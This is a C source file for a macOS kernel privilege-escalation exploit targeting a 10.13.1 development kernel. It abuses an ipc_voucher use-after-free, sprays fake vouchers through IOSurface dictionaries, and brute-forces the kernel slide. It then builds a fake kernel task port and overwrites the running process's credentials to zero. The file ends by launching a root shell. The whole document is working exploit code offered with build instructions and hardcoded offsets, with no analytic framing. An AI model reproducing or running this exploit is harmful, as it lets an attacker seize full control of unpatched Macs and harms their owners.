#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <assert.h>
#include <atm/atm_types.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <mach/mach_vm.h>
#include <mach/thread_act.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <unistd.h>

// clang getroot.c -o getroot -fno-stack-protector -mmacosx-version-min=10.12 -framework IOKit -framework IOSurface
// the offsets are from macOS 10.13.1 development kernel
// Darwin Kernel Version 17.2.0: Fri Sep 29 18:27:03 PDT 2017; root:xnu-4570.20.62~3/DEVELOPMENT_X86_64 x86_64

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2

#define PUSH_DICT(ptr, value) \
    do {                      \
        *(ptr++) = (value);   \
    } while (0)

// #define kOSSerializeBinarySignature "\323\0\0" /* 0x000000d3 */
#define kOSSerializeBinarySignature 0x000000d3
    enum {
        kOSSerializeDictionary      = 0x01000000U,
        kOSSerializeArray           = 0x02000000U,
        kOSSerializeSet             = 0x03000000U,
        kOSSerializeNumber          = 0x04000000U,
        kOSSerializeSymbol          = 0x08000000U,
        kOSSerializeString          = 0x09000000U,
        kOSSerializeData            = 0x0a000000U,
        kOSSerializeBoolean         = 0x0b000000U,
        kOSSerializeObject          = 0x0c000000U,

        kOSSerializeTypeMask        = 0x7F000000U,
        kOSSerializeDataMask        = 0x00FFFFFFU,

        kOSSerializeEndCollection   = 0x80000000U,
    };

struct fake_ipc_object {
    // struct ipc_object {
    // 	ipc_object_bits_t io_bits;
    // 	ipc_object_refs_t io_references;
    // 	lck_spin_t io_lock_data;
    // };

    natural_t io_bits;  // this is from struct ipc_object
    natural_t io_references;
    struct {
        void *data;
        uint32_t type;
        uint32_t pad;
    } ip_lock;  // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    void *next;
                    void *prev;
                } waitq_queue;
            } waitq;
            void *messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        void *klist;
    } ip_messages;
    void *ip_receiver;
    void *ip_kobject;
    void *ip_nsrequest;
    void *ip_pdrequest;
    void *ip_requests;
    void *ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
};

struct fake_ipc_voucher {
    uint32_t iv_hash; /* checksum hash */
    uint32_t iv_sum;  /* checksum of values */
    uint32_t iv_refs; /* reference count */
    uint32_t iv_table_size;
    uint32_t iv_inline_table[6];
    uint64_t padding0;
    uint64_t iv_table;
    uint64_t iv_port;
    uint64_t iv_hash_link_next;
    uint64_t iv_hash_link_prev;
};

typedef struct
{
    char padding[0x6C8];
} surface_t;
// 0x6C8

mach_port_t *create_ports(size_t cnt);
int *create_pipes(size_t *pipe_count);
static mach_port_t *voucher_spray(size_t count);
kern_return_t edit_voucher_reference(mach_port_t voucher_to_release, mach_port_t voucher_to_retain);
surface_t *create_surface(io_connect_t client);
size_t ipc_port_zone_block_size;
size_t ipc_voucher_zone_block_size;
uint32_t *construct_dict(uint32_t pagesize, uint32_t surface_id, struct fake_ipc_object *obj, struct fake_ipc_voucher *voucher, size_t spray_size, size_t *dict_size);
#define kPortsCount 50000

size_t message_size_for_kalloc_size(size_t kalloc_size) {
    return ((3 * kalloc_size) / 4) - 0x74;
}

mach_port_t send_kalloc_message(void *message_body, uint32_t message_size) {
    struct simple_msg {
        mach_msg_header_t hdr;
        char buf[0];
    };
    mach_port_t q;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_port_set_attributes(mach_task_self(), q, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + message_size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(msg->buf, message_body, message_size);
    for (int i = 0; i < 256; i++) {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414141;
        kern_return_t kr = mach_msg_send((mach_msg_header_t *)msg);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "[-] failed to send message\n");
        }
    }
    return q;
}

void trigger_zone_gc() {
    uint32_t body_size = message_size_for_kalloc_size(16384) - sizeof(mach_msg_header_t);
    void *body = malloc(body_size);
    memset(body, 'A', sizeof(body));
    mach_port_t ports[100] = {0};
    int port_mx = 0;
    int64_t avgTime = 0;
    for (int i = 0; i < 100; i++) {
        uint64_t t0;
        int64_t tdelta;

        t0 = mach_absolute_time();
        ports[i] = send_kalloc_message(body, body_size);
        tdelta = mach_absolute_time() - t0;

        if (avgTime && tdelta - avgTime > avgTime / 2) {
            printf("[+] got gc at %d -- breaking\n", i);
            port_mx = i;
            break;
        }
        avgTime = (avgTime * i + tdelta) / (i + 1);
    }
    for (int i = 0; i <= port_mx; i++) mach_port_deallocate(mach_task_self(), ports[i]);
    sched_yield();
    sleep(1);
    free(body);
}

uint32_t __attribute__((always_inline)) read_kernel(mach_port_t port, void *faketask, uint64_t addr) {
    uint32_t res;
    *(uint64_t *)(faketask + 0x390) = addr - 0x10;
    kern_return_t kr = pid_for_task(port, (int *)&res);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] failed to read kernel address %s\n", mach_error_string(kr));
    }
    return res;
}

uint64_t __attribute__((always_inline)) read_kernel64(mach_port_t port, void *faketask, uint64_t addr) {
    uint64_t res = 0;
    *(uint64_t *)(faketask + 0x390) = addr - 0x10;
    pid_for_task(port, (int *)&res);
    *(uint64_t *)(faketask + 0x390) = addr + 0x4 - 0x10;
    pid_for_task(port, (int *)(((char *)&res) + 0x4));
    return res;
}

int main() {
    kern_return_t kr;
    mach_port_t thread;
    mach_port_t base_port;
    io_connect_t client;
    size_t dict_size;

    ipc_port_zone_block_size = getpagesize();

    printf("[*] page size: %d\n", getpagesize());
    // trigger_zone_gc();

    struct fake_ipc_object *fakeport = (struct fake_ipc_object *)mmap(0, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    printf("[+] fakeport %p\n", fakeport);

    fakeport->io_bits = IO_BITS_ACTIVE | 25;
    ((char *)fakeport + 8)[12] = 0x11;
    fakeport->io_references = 0xff;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 10;
    fakeport->ip_srights = 10;

    struct fake_ipc_voucher fakevoucher = {
        .iv_hash = 0x6B637566,
        .iv_sum = 0x4C504141,
        .iv_refs = 0x11,
        .iv_port = (uint64_t)fakeport  // we can retrive our port later with thread_get_voucher_port()
    };

    printf("[*] fake voucher size: 0x%lx\n", sizeof(struct fake_ipc_voucher));

    CFDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    io_service_t service = IOServiceGetMatchingService(
        kIOMasterPortDefault,
        matching);

    if (service == 0) {
        fprintf(stderr, "[-] failed to open service\n");
        exit(1);
    }

    kr = IOServiceOpen(service, mach_task_self(), 0, &client);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] failed to open client\n");
        exit(1);
    }
    printf("[*] Got service 0x%x\n", client);
    surface_t *surface = create_surface(client);
    printf("[*] surface id: 0x%x\n", *((uint32_t *)(&((char *)surface)[0x10])));

    uint32_t *spray_dict = construct_dict(
        getpagesize(),
        *((uint32_t *)(&((char *)surface)[0x10])),
        fakeport,
        &fakevoucher,
        0x8000000,
        &dict_size);
    printf("[*] spray dict size: %zu\n", dict_size);

    kr = thread_create(mach_task_self(), &thread);
    if (kr != KERN_SUCCESS) {
        printf("[!] Failed to create thread: %s\n", mach_error_string(kr));
        goto clean;
    }

    // create some pipes so we can spray pipe buffers later
    struct rlimit rl = {};
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    int err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err) {
        printf("[!] Failed to set rlimit: %s\n", strerror(err));
        exit(1);
    }

    // printf("[*] spraying ports\n");
    // mach_port_t *ports = create_ports(kPortsCount + 1);
    // base_port = ports[kPortsCount];
    // printf("[*] base port: %x\n", base_port);
    // if(ports == NULL) {
    //     printf("[!] Failed to create ports\n");
    //     exit(1);
    // }

    // we need to trigger garbage collection in ipc vouchers zone.
    // so spray vouchers here
    printf("[*] ready to spray vouchers\n");
    mach_voucher_attr_recipe_data_t atm_data = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };
    ipc_voucher_t voucher_ports[0x3000];
    for (int i = 0; i < 0x3000; ++i) {
        host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &voucher_ports[i]);
    }
    ipc_voucher_t uaf_voucher_port = voucher_ports[0x2001];

    // set thread -> ipc_voucher
    // thread_abort(thread);
    printf("[*] uaf voucher 0x%x thread 0x%x\n", uaf_voucher_port, thread);
    kr = thread_set_mach_voucher(thread, uaf_voucher_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] failed to set voucher\n");
        fprintf(stderr, "[-] %s\n", mach_error_string(kr));
        goto clean;
    }
    printf("[+] voucher stored\n");
    // trigger the bug
    printf("[*] decrease the reference to 1\n");
    kr = edit_voucher_reference(uaf_voucher_port, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] failed to edit voucher reference count\n");
        goto clean;
    }

    // now free all the voucher
    printf("[*] clean vouchers\n");
    mach_port_deallocate(mach_task_self(), uaf_voucher_port);
    for (int i = 0; i < 0x3000; ++i) {
        if (i == 0x2001) continue;
        mach_port_deallocate(mach_task_self(), voucher_ports[i]);
    }
    usleep(10000);

    printf("[*] ready to trigger zone gc\n");
    trigger_zone_gc();

    printf("[*] spray fake voucher\n");
    uint32_t o = 0;
    size_t so = sizeof(uint32_t);
    kr = IOConnectCallStructMethod(
        client,
        9,
        spray_dict,
        dict_size,
        &o,
        &so);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] failed to set value: %s\n", mach_error_string(kr));
        goto clean;
    }

    printf("[+] spray fake voucher\n");

    mach_port_t fakevoucher_port;
    thread_get_mach_voucher(thread, 0, &fakevoucher_port);
    printf("[*] get our fake voucher port 0x%x\n", fakevoucher_port);

    uint64_t clock_list = 0xffffff8000c32270;
    uint64_t clock_list_addr = 0;
    uint64_t allproc = 0xffffff8000d0af60;
    uint64_t base = 0xffffff8000200000;
    uint64_t kernel_slide = 0;
    boolean_t found_clock = 0;
    for (int i = 0; i < 0xFFFF; ++i) {
        for (int j = 0; j < 0x200000 / 8; j += 8) {
            *(uint64_t *)(((uint64_t)fakeport) + 0x68) = base + i * 0x200000 + j;
            kr = clock_sleep_trap(fakevoucher_port, 0, 0, 0, 0);
            if (kr != KERN_FAILURE) {
                printf("[+] found clock_list! 0x%llx\n", *(uint64_t *)(((uint64_t)fakeport) + 0x68));
                clock_list_addr = *(uint64_t *)(((uint64_t)fakeport) + 0x68);
                found_clock = 1;
                goto found;
            }
        }
    }
found:
    if (found_clock != 1) {
        fprintf(stderr, "[-] failed to find clock_list\n");
        goto clean;
        exit(1);
    }
    kernel_slide = clock_list_addr - clock_list;
    printf("[+] kernel slide: 0x%llx\n", kernel_slide);
    printf("[+] _allproc: 0x%llx\n", allproc + kernel_slide);
    allproc += kernel_slide;

    fakeport->io_bits = IKOT_TASK | IO_BITS_ACTIVE;
    char *faketask = ((char *)fakeport) + 0x1000;

    *(uint64_t *)(((uint64_t)fakeport) + 0x68) = (uint64_t)faketask;  // kobject
    *(uint64_t *)(((uint64_t)fakeport) + 0xa0) = 0xff;
    *(uint64_t *)(faketask + 0x10) = 0xee;

    uint32_t proc_offset = 0, r1, r2;
    uint64_t res = 0;
    uint64_t kernel_proc = 0, self_proc = 0;
    mach_port_insert_right(mach_task_self(), fakevoucher_port, fakevoucher_port, MACH_MSG_TYPE_COPY_SEND);

    uint64_t n;
    r1 = read_kernel(fakevoucher_port, faketask, allproc);
    r2 = read_kernel(fakevoucher_port, faketask, allproc + 0x4);
    memcpy((char *)&n, &r1, sizeof(uint32_t));
    memcpy((char *)&n + 4, &r2, sizeof(uint32_t));
    printf("[+] lh_first 0x%llx\n", n);
    allproc = n;
    // while(1) { }

    while (1) {
        uint64_t n;
        r1 = read_kernel(fakevoucher_port, faketask, allproc);
        r2 = read_kernel(fakevoucher_port, faketask, allproc + 0x4);
        memcpy((char *)&n, &r1, sizeof(uint32_t));
        memcpy((char *)&n + 4, &r2, sizeof(uint32_t));

        uint32_t proc = read_kernel(fakevoucher_port, faketask, allproc + 0x10);
        // printf("[*] traverse pid=%d\n", proc);
        if (proc == getpid()) {
            self_proc = allproc;
            printf("[+] found self proc pid=%d addr=0x%llx\n", proc, self_proc);
        } else if (proc == 0) {
            kernel_proc = allproc;
            printf("[+] found kernel proc pid=%d addr=0x%llx\n", proc, kernel_proc);
        }
        allproc = n;
        if (self_proc != 0 && kernel_proc != 0) break;
    }
    char *kernel_task_port_dump = malloc(0x1000);
    char *kernel_task_dump = malloc(0x1000);

    uint64_t kernel_task = 0, kernel_itk_self = 0;  // osfmk/kern/task
    uint64_t kernel_map = 0, kernel_ipc_space;

    r1 = read_kernel(fakevoucher_port, faketask, kernel_proc + 0x18);
    r2 = read_kernel(fakevoucher_port, faketask, kernel_proc + 0x18 + 0x4);
    memcpy((char *)&kernel_task, &r1, sizeof(uint32_t));
    memcpy((char *)&kernel_task + 4, &r2, sizeof(uint32_t));
    printf("[+] kernel_task=0x%llx\n", kernel_task);

    r1 = read_kernel(fakevoucher_port, faketask, kernel_task + 0xe0);
    r2 = read_kernel(fakevoucher_port, faketask, kernel_task + 0xe0 + 0x4);
    memcpy((char *)&kernel_itk_self, &r1, sizeof(uint32_t));
    memcpy((char *)&kernel_itk_self + 4, &r2, sizeof(uint32_t));

    printf("[+] kernel_itk_sself=0x%llx\n", kernel_itk_self);

    r1 = read_kernel(fakevoucher_port, faketask, kernel_task + 0x20);
    r2 = read_kernel(fakevoucher_port, faketask, kernel_task + 0x20 + 0x4);
    memcpy((char *)&kernel_map, &r1, sizeof(uint32_t));
    memcpy((char *)&kernel_map + 4, &r2, sizeof(uint32_t));

    printf("[+] kernel_map=0x%llx\n", kernel_map);

    for (int i = 0; i < 0x1000 / 4; ++i) {
        r1 = read_kernel(fakevoucher_port, faketask, kernel_task + i * 4);
        memcpy(kernel_task_dump + i * 4, &r1, sizeof(uint32_t));
    }

    for (int i = 0; i < 0x1000 / 4; ++i) {
        r1 = read_kernel(fakevoucher_port, faketask, kernel_itk_self + i * 4);
        memcpy(kernel_task_port_dump + i * 4, &r1, sizeof(uint32_t));
    }

    struct fake_ipc_object userland_kernel_port;
    memcpy(&userland_kernel_port, kernel_task_port_dump, sizeof(struct fake_ipc_object));
    memcpy(faketask, kernel_task_dump, 0x1000);
    printf("[+] ip_receiver: %p\n", userland_kernel_port.ip_receiver);

    //get root
    uint64_t cred;
    r1 = read_kernel(fakevoucher_port, faketask, self_proc + 0xe8);
    r2 = read_kernel(fakevoucher_port, faketask, self_proc + 0xe8 + 0x4);
    memcpy((char *)&cred, &r1, sizeof(uint32_t));
    memcpy((char *)&cred + 4, &r2, sizeof(uint32_t));

    printf("[+] found cred 0x%llx\n", cred);

    *(uint64_t *)(((uint64_t)fakeport) + 0x68) = (uint64_t)faketask;
    *(uint64_t *)(((uint64_t)fakeport) + 0xa0) = 0xff;
    *(uint64_t *)(((uint64_t)fakeport) + 0x60) = (uint64_t)userland_kernel_port.ip_receiver;  // receiver
    *(uint64_t *)(((uint64_t)faketask) + 0x2b8) = kernel_itk_self;                            // itk_host
    *(uint64_t *)(((uint64_t)faketask) + 0x10) = 0xff;                                        // reference count
    *(uint64_t *)(((uint64_t)faketask) + 0x20) = kernel_map;                                  // overwrite map
    *(uint64_t *)(((uint64_t)faketask) + 0x14) = 1;                                           // active task

    uint64_t u = 0;
    kr = mach_vm_write(fakevoucher_port, cred + 0x18, (vm_offset_t)&u, (mach_msg_type_number_t)8);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] failed to overwrite cred: %s\n", mach_error_string(kr));
    }
    if (getuid() == 0) printf("[+] g0t r00t! getuid = %d\n", getuid());

    system("/bin/bash");
clean:
    thread_set_mach_voucher(thread, MACH_PORT_NULL);
    return 0;
}

typedef struct __attribute__((packed)) {
    mach_voucher_attr_recipe_data_t user_data_recipe;
    uint64_t user_data_content[2];
} voucher_recipes;

static mach_port_t *
voucher_spray(size_t count) {
    mach_port_t *voucher_ports = calloc(count, sizeof(*voucher_ports));
    for (size_t i = 0; i < count; i++) {
        mach_port_t voucher = MACH_PORT_NULL;
        mach_voucher_attr_recipe_data_t atm_data = {
            .key = MACH_VOUCHER_ATTR_KEY_ATM,
            .command = 510};
        kern_return_t kr = host_create_mach_voucher(
            mach_host_self(),
            (mach_voucher_attr_raw_recipe_array_t)&atm_data,
            sizeof(atm_data),
            &voucher);
        voucher_ports[i] = voucher;
    }
    return voucher_ports;
}

mach_port_t *create_ports(size_t cnt) {
    mach_port_t *ports = malloc(cnt * sizeof(mach_port_t));
    memset(ports, 0, cnt * sizeof(mach_port_t));
    mach_port_options_t options = {};
    for (int i = 0; i < cnt; ++i) {
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) {
            printf("[!] Failed to create port: %s\n", mach_error_string(kr));
            exit(1);
        }
    }
    return ports;
}

kern_return_t edit_voucher_reference(mach_port_t voucher_to_release, mach_port_t voucher_to_retain) {
    mach_port_t voucher = voucher_to_retain;
    kern_return_t kr = task_swap_mach_voucher(mach_task_self(), voucher_to_release, &voucher);
    if (kr == KERN_SUCCESS && MACH_PORT_VALID(voucher)) {
        kr = mach_port_deallocate(mach_task_self(), voucher);
    }
    return kr;
}

surface_t *create_surface(io_connect_t client) {
    uint32_t dict_create[] = {
        0x000000d3,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        kOSSerializeSymbol | 19,
        0x75534f49,
        0x63616672,
        0x6c6c4165,
        0x6953636f,
        0x657a,  // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        (uint32_t)getpagesize(),
        0x0,
    };
    size_t size = sizeof(surface_t);
    surface_t *surface = malloc(sizeof(surface_t));
    memset(surface, 0, sizeof(surface_t));
    kern_return_t kr = IOConnectCallStructMethod(
        client,
        0,
        dict_create,
        sizeof(dict_create),
        surface,
        &size);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "failed to create surface\n");
        exit(1);
    }
    // for(char *ptr = surface; ptr < (char *)surface+0x6c8; ptr += 4) {
    //     printf("0x%x\n", *((uint32_t *)ptr));
    // }
    // printf("0x%x\n", *(uint32_t *)(&((char *)surface)[0x10]));
    return surface;
}

uint32_t transpose(uint32_t val) {
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8) {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

uint32_t *construct_dict(uint32_t pagesize, uint32_t surface_id, struct fake_ipc_object *obj, struct fake_ipc_voucher *voucher, size_t spray_size, size_t *dict_size) {
    size_t spray_page = spray_size / pagesize;
    size_t size = 5 * sizeof(uint32_t) + spray_page * (4 * sizeof(uint32_t) + pagesize);
    *dict_size = size;
    uint32_t *dict = calloc(size, 1);
    uint32_t *ptr = dict;
    PUSH_DICT(ptr, surface_id);
    PUSH_DICT(ptr, 0);
    PUSH_DICT(ptr, (kOSSerializeBinarySignature));
    PUSH_DICT(ptr, (kOSSerializeEndCollection | kOSSerializeArray | 1));
    PUSH_DICT(ptr, (kOSSerializeEndCollection | kOSSerializeDictionary | spray_page));
    for (int i = 0; i < spray_page; ++i) {
        PUSH_DICT(ptr, (kOSSerializeSymbol | 5));
        PUSH_DICT(ptr, i);
        PUSH_DICT(ptr, 0);
        if (i != spray_page - 1) {
            PUSH_DICT(ptr, (kOSSerializeString | (pagesize - 1)));
        } else {
            PUSH_DICT(ptr, (kOSSerializeString | kOSSerializeEndCollection | (pagesize - 1)));
        }
        for (uint64_t p = (uint64_t)ptr;
             p + sizeof(struct fake_ipc_voucher) <= (uint64_t)ptr + pagesize;
             p += sizeof(struct fake_ipc_voucher)) {
            bcopy((void *)voucher, (void *)p, sizeof(struct fake_ipc_voucher));
        }
        ptr += pagesize / sizeof(uint32_t);
    }
    return dict;
}
